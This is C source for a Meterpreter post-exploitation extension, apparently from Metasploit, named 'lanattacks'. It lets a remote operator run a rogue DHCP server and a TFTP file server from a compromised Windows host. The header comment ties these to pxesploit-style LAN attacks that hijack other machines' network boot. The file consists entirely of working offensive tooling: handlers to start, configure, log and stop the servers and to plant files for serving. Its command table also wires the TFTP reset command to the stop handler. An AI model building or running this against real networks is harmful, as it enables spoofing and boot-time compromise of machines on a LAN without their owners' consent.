/*
 * This module implements LAN attacks, like pxesploit and DHCP attacks 
 */
#define _CRT_SECURE_NO_DEPRECATE 1
#include "../../common/common.h"
#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
#include <windows.h>
#include "lanattacks.h"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

void* dhcpserver = NULL; //global DHCP server pointer
void* tftpserver = NULL; //global TFTP server pointer

//Launches the DHCP server
DWORD request_lanattacks_start_dhcp(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);

	int res = startDHCPServer(dhcpserver);

	packet_transmit_response(res, remote, response);
	
	return ERROR_SUCCESS;
}

//Reset the DHCP server
DWORD request_lanattacks_reset_dhcp(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);

	destroyDHCPServer(dhcpserver);
	dhcpserver = createDHCPServer();

	packet_transmit_response(ERROR_SUCCESS, remote, response);
	
	return ERROR_SUCCESS;
}

//Set a DHCP option based on the name and value specified in the packet
DWORD request_lanattacks_set_dhcp_option(Remote *remote, Packet *packet)
{
	DWORD retval = ERROR_SUCCESS;
	char* name = NULL;
	unsigned int namelen = 0;
	Packet *response = packet_create_response(packet);

	do
	{
		//Get option value
		Tlv tlv;
		if ((retval = packet_get_tlv(packet, TLV_TYPE_LANATTACKS_OPTION, &tlv)) != ERROR_SUCCESS)
		{
			break;
		}

		//Get option name
		name = packet_get_tlv_value_string(packet, TLV_TYPE_LANATTACKS_OPTION_NAME);
		namelen = (unsigned int)strlen(name);
		setDHCPOption(dhcpserver, name, namelen, (char*)tlv.buffer, tlv.header.length);
	} while (0);

	packet_transmit_response(retval, remote, response);
	return ERROR_SUCCESS;
}

//Turns off the DHCP server
DWORD request_lanattacks_stop_dhcp(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);

	int res = stopDHCPServer(dhcpserver);

	packet_transmit_response(res, remote, response);

	return ERROR_SUCCESS;
}

//Gets and resets the DHCP log
DWORD request_lanattacks_dhcp_log(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);

	unsigned long loglen;
	unsigned char * log = getDHCPLog(dhcpserver, &loglen);

	packet_add_tlv_raw(response, TLV_TYPE_LANATTACKS_RAW, log, loglen);
	packet_transmit_response(ERROR_SUCCESS, remote, response);
	free(log);

	return ERROR_SUCCESS;
}

//Launches the TFTP server
DWORD request_lanattacks_start_tftp(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);

	int res = startTFTPServer(tftpserver);

	packet_transmit_response(res, remote, response);
	
	return ERROR_SUCCESS;
}

//Reset the TFTP server
DWORD request_lanattacks_reset_tftp(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);

	destroyTFTPServer(tftpserver);
	tftpserver = createTFTPServer();

	packet_transmit_response(ERROR_SUCCESS, remote, response);
	
	return ERROR_SUCCESS;
}

//Adds a file to serve based on the name and value specified in the packet
DWORD request_lanattacks_add_tftp_file(Remote *remote, Packet *packet)
{
	DWORD retval = ERROR_SUCCESS;
	char* name = NULL;
	unsigned int namelen = 0;
	Packet *response = packet_create_response(packet);

	do{
		Tlv tlv;
		//Get file contents
		if ((retval = packet_get_tlv(packet, TLV_TYPE_LANATTACKS_RAW, &tlv)) != ERROR_SUCCESS)
		{
			break;
		}

		//Get file name
		name = packet_get_tlv_value_string(packet, TLV_TYPE_LANATTACKS_OPTION_NAME);
		namelen = (unsigned int)strlen(name);
		addTFTPFile(tftpserver, name, namelen, (char*)tlv.buffer, tlv.header.length);
	} while (0);

	packet_transmit_response(retval, remote, response);
	return ERROR_SUCCESS;
}

//Turns off the TFTP server
DWORD request_lanattacks_stop_tftp(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);

	int res = stopTFTPServer(tftpserver);

	packet_transmit_response(res, remote, response);
	
	return ERROR_SUCCESS;
}

Command customCommands[] =
{
	COMMAND_REQ("lanattacks_start_dhcp", request_lanattacks_start_dhcp),
	COMMAND_REQ("lanattacks_reset_dhcp", request_lanattacks_reset_dhcp),
	COMMAND_REQ("lanattacks_set_dhcp_option", request_lanattacks_set_dhcp_option),
	COMMAND_REQ("lanattacks_stop_dhcp", request_lanattacks_stop_dhcp),
	COMMAND_REQ("lanattacks_dhcp_log", request_lanattacks_dhcp_log),
	COMMAND_REQ("lanattacks_start_tftp", request_lanattacks_start_tftp),
	COMMAND_REQ("lanattacks_reset_tftp", request_lanattacks_stop_tftp),
	COMMAND_REQ("lanattacks_add_tftp_file", request_lanattacks_add_tftp_file),
	COMMAND_REQ("lanattacks_stop_tftp", request_lanattacks_stop_tftp),
	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	hMetSrv = remote->met_srv;

	command_register_all(customCommands);

	dhcpserver = createDHCPServer();
	tftpserver = createTFTPServer();

	if (tftpserver)
	{
		return ERROR_SUCCESS;
	}

	return ERROR_NOT_ENOUGH_MEMORY;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	destroyTFTPServer(tftpserver);
	tftpserver = NULL;

	destroyDHCPServer(dhcpserver);
	dhcpserver = NULL;

	command_deregister_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Get the name of the extension.
 * @param buffer Pointer to the buffer to write the name to.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
{
	strncpy_s(buffer, bufferSize, "lanattacks", bufferSize - 1);
	return ERROR_SUCCESS;
}
